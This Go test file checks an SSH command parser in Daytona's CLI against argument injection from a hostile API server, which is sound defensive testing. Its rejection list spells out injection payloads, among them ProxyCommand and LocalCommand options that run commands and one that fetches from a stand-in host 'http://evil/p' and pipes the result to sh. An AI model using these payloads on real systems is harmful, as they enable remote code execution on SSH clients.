// Copyright Daytona Platforms Inc.
// SPDX-License-Identifier: AGPL-3.0

package common

import (
	"strings"
	"testing"
	"unicode"
)

const testToken = "Ab3Cd4Ef5Gh6Ij7Kl8Mn9Op0Qr1St2Uv"

// The token is opaque to the CLI: any NanoID over the full URL alphabet is accepted
// so long as it does not start with '-'.
const urlAlphabetToken = "Ab3Cd4_f5Gh6Ij7Kl8Mn9Op0Qr1St2U-"

// Shapes the API actually emits, across every SSH gateway configuration in use.
func TestParseSSHCommandAcceptsServerShapes(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    []string
	}{
		{"default port", "ssh " + testToken + "@ssh-gateway.example.com", []string{testToken + "@ssh-gateway.example.com"}},
		{"explicit port", "ssh -p 2222 " + testToken + "@ssh.example.com", []string{"-p", "2222", testToken + "@ssh.example.com"}},
		{"single label host", "ssh -p 2222 " + testToken + "@localhost", []string{"-p", "2222", testToken + "@localhost"}},
		{"ipv4 host", "ssh -p 2222 " + testToken + "@136.112.118.135", []string{"-p", "2222", testToken + "@136.112.118.135"}},
		// Emitted when the SSH gateway is addressed by an IPv6 literal.
		{"ipv6 host", "ssh -p 2222 " + testToken + "@[::1]", []string{"-p", "2222", testToken + "@[::1]"}},
		{"absolute fqdn", "ssh -p 2222 " + testToken + "@gateway.example.com.", []string{"-p", "2222", testToken + "@gateway.example.com."}},
		// Any NanoID over the full URL alphabet, not only the subset the API emits today.
		{"url alphabet token", "ssh -p 2222 " + urlAlphabetToken + "@ssh.example.com", []string{"-p", "2222", urlAlphabetToken + "@ssh.example.com"}},
		{"token starting with underscore", "ssh _" + testToken + "@h.example.com", []string{"_" + testToken + "@h.example.com"}},
		{
			"long elb hostname",
			"ssh -p 2222 " + testToken + "@a027787affaac46229a4a91ee7c07b6e-625769887.us-west-2.elb.amazonaws.com",
			[]string{"-p", "2222", testToken + "@a027787affaac46229a4a91ee7c07b6e-625769887.us-west-2.elb.amazonaws.com"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ParseSSHCommand(tt.command)
			if err != nil {
				t.Fatalf("rejected a legitimate command: %v", err)
			}
			if strings.Join(got, "\x00") != strings.Join(tt.want, "\x00") {
				t.Errorf("argv = %q, want %q", got, tt.want)
			}
		})
	}
}

// Argument injection (CWE-88). Every entry is a command a malicious or compromised
// API server could return.
func TestParseSSHCommandRejectsInjection(t *testing.T) {
	commands := []string{
		// ${IFS} encodes the payload without a literal space, so it survives
		// whitespace splitting as a single token.
		`ssh -oProxyCommand=touch${IFS}/tmp/marker token@localhost`,
		// Option before, after and instead of the destination.
		"ssh -oProxyCommand=id " + testToken + "@h",
		"ssh " + testToken + "@h -oProxyCommand=id",
		"ssh -p 2222 -oProxyCommand={curl,-s,http://evil/p}|sh " + testToken + "@h",
		"ssh -p 2222 -o ProxyCommand=P " + testToken + "@h",
		"ssh -p 22 -F/tmp/evilconf " + testToken + "@h",
		"ssh -p 22 -E/tmp/out " + testToken + "@h",
		"ssh -p 2222 -oPermitLocalCommand=yes -oLocalCommand=id " + testToken + "@h",
		// A "--" terminator does not help when the payload precedes the destination.
		"ssh -p 2222 -oProxyCommand=id -- " + testToken + "@h",
		// Whitespace variants: strings.Fields splits on all of these.
		"ssh " + testToken + "@h\t-oProxyCommand=id",
		"ssh " + testToken + "@h\n-oProxyCommand=id",
		"ssh " + testToken + "@h\v-oProxyCommand=id",
		"ssh " + testToken + "@h\u00a0-oProxyCommand=id", // NBSP, escaped so it survives review and reformatting
		"ssh  -oProxyCommand=id  " + testToken + "@h",
		// Anchoring.
		"ssh " + testToken + "@h\n",
		"\nssh " + testToken + "@h",
		"ssh " + testToken + "@h\x00",
		// Shape violations.
		"ssh -p 2222 " + testToken + "@h extra",
		"ssh " + testToken + "@h;id",
		"ssh " + testToken + "@tok@evil.example.com",
		"ssh " + testToken + "@ssh://evil.com",
		// The boundary of the widened token class: '-' is legal inside a token but
		// never first, or the whole destination reads as an ssh option.
		"ssh -" + testToken + "@h",
		"ssh -" + urlAlphabetToken + "@h",
		"ssh " + testToken + "@-h",
		"ssh " + testToken + "@...",
		"SSH " + testToken + "@h",
		"ssh",
		"",
	}

	for _, command := range commands {
		if args, err := ParseSSHCommand(command); err == nil {
			t.Errorf("accepted injection %q -> argv %q", command, args)
		}
	}
}

// The length guard caps the cost of scanning a hostile multi-megabyte response,
// which the pattern would otherwise walk in full before failing.
func TestParseSSHCommandRejectsOversizedInput(t *testing.T) {
	for _, size := range []int{600, 1 << 20} {
		if _, err := ParseSSHCommand("ssh " + testToken + "@" + strings.Repeat("a", size)); err == nil {
			t.Errorf("accepted a command with a %d byte host", size)
		}
	}
}

// The pattern bounds the host but not the token, so the guard is what bounds total
// length. This pins where that boundary falls: a token far larger than any server
// emits is refused even though the pattern alone would match it.
func TestParseSSHCommandBoundsTotalLength(t *testing.T) {
	host := "@ssh.example.com"

	if _, err := ParseSSHCommand("ssh -p 2222 " + strings.Repeat("a", 400) + host); err != nil {
		t.Errorf("rejected a 400 byte token, which is within the limit: %v", err)
	}

	oversized := "ssh -p 2222 " + strings.Repeat("a", 500) + host
	if !sshCommandPattern.MatchString(oversized) {
		t.Error("expected the pattern itself to match; the guard is what should reject this")
	}
	if _, err := ParseSSHCommand(oversized); err == nil {
		t.Error("accepted a command over the length limit")
	}
}

// The error must not leak the server string: it carries the SSH access token and
// can contain terminal escape sequences.
func TestParseSSHCommandErrorOmitsServerInput(t *testing.T) {
	_, err := ParseSSHCommand("ssh -oProxyCommand=id " + testToken + "@h\x1b[2J")
	if err == nil {
		t.Fatal("expected an error")
	}
	if strings.Contains(err.Error(), testToken) || strings.Contains(err.Error(), "\x1b") {
		t.Errorf("error leaks server input: %q", err)
	}
}

// The invariant the whole function exists to hold: nothing it returns may be read
// by ssh(1) as an option.
func TestParseSSHCommandNeverEmitsAnOption(t *testing.T) {
	commands := []string{
		"ssh " + testToken + "@ssh-gateway.example.com",
		"ssh -p 2222 " + testToken + "@ssh.example.com",
		"ssh -p 2222 " + testToken + "@[::1]",
		"ssh -p 2222 " + testToken + "@gateway.example.com.",
	}

	for _, command := range commands {
		args, err := ParseSSHCommand(command)
		if err != nil {
			t.Fatalf("rejected %q: %v", command, err)
		}
		if len(args) != 1 && len(args) != 3 {
			t.Errorf("argv length %d for %q, want 1 or 3", len(args), command)
		}
		for i, arg := range args {
			if arg == "" {
				t.Errorf("empty argv element from %q", command)
				continue
			}
			if strings.HasPrefix(arg, "-") && (i != 0 || arg != "-p") {
				t.Errorf("option-like argv %q from %q", arg, command)
			}
			if strings.ContainsFunc(arg, unicode.IsSpace) {
				t.Errorf("argv %q from %q contains whitespace", arg, command)
			}
		}
	}
}

// ParseSSHCommand returns strings.Fields of the matched string rather than
// rebuilding the argument vector, which is only safe because the pattern's
// character classes admit no whitespace: every space in a matching string is one of
// the pattern's own literals, so Fields yields exactly the shape the pattern
// describes.
//
// This pins that invariant. Widening any class to accept whitespace would let a
// server split one element into two, the second of which ssh(1) could read as an
// option, and that regression must fail here rather than in the field.
func TestPatternAdmitsNoWhitespace(t *testing.T) {
	var spaces []rune
	for r := rune(0); r <= unicode.MaxRune; r++ {
		if unicode.IsSpace(r) {
			spaces = append(spaces, r)
		}
	}
	if len(spaces) == 0 {
		t.Fatal("found no whitespace runes to test with")
	}

	shapes := []string{
		"ssh " + testToken + "@ssh.example.com",
		"ssh -p 2222 " + testToken + "@ssh.example.com",
		"ssh -p 2222 " + testToken + "@[::1]",
		"ssh -p 2222 " + testToken + "@gateway.example.com.",
	}

	for _, shape := range shapes {
		for _, r := range spaces {
			for i := 0; i <= len(shape); i++ {
				mutated := shape[:i] + string(r) + shape[i:]
				if sshCommandPattern.MatchString(mutated) {
					t.Fatalf("pattern matched %q after inserting %U at offset %d; "+
						"its character classes must never admit whitespace", mutated, r, i)
				}
			}
		}
	}
}

// Guards the same assumption against inputs no hand-written case would think of.
// Not run by default: use `go test -run=XXX -fuzz=FuzzParseSSHCommand`.
func FuzzParseSSHCommand(f *testing.F) {
	f.Add("ssh " + testToken + "@ssh.example.com")
	f.Add("ssh -p 2222 " + testToken + "@ssh.example.com")
	f.Add("ssh -oProxyCommand=id " + testToken + "@h")
	f.Add("ssh -p 2222 " + testToken + "@[::1]")

	f.Fuzz(func(t *testing.T, command string) {
		args, err := ParseSSHCommand(command)
		if err != nil {
			return
		}
		if len(args) != 1 && len(args) != 3 {
			t.Fatalf("argv length %d from %q", len(args), command)
		}
		for i, arg := range args {
			if arg == "" {
				t.Fatalf("empty argv element from %q", command)
			}
			if strings.HasPrefix(arg, "-") && (i != 0 || arg != "-p") {
				t.Fatalf("option-like argv %q from %q", arg, command)
			}
			if strings.ContainsFunc(arg, unicode.IsSpace) {
				t.Fatalf("whitespace in argv %q from %q", arg, command)
			}
		}
	})
}
